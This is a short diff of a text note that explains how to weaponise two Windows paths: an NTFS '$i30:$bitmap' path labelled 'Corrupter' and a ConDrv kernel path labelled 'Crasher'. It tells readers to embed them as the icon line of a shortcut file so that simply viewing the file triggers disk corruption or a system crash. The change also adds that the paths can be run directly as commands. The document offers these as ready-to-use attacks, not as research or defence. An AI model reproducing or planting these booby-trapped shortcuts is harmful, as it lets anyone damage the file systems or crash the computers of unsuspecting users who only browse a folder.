@@ -1,10 +1,12 @@
  You can implement:
  
- file:///C:/:$i30:$bitmap                                              :Corrupter
- file://./GLOBALROOT/Device/ConDrv/KernelConnect                       :Crasher
+ C:/:$i30:$bitmap                                              :Corrupter
+ //./GLOBALROOT/Device/ConDrv/KernelConnect                    :Crasher
  
  Into a shortcut file, when you view it it does something
  (to do it change icon, edit the icon file in notepad++, to the line of code)
+ 
+ Or you can run them as commands (command prompt)
  
  eg.
  [{000214A0-0000-0000-C000-000000000046}]
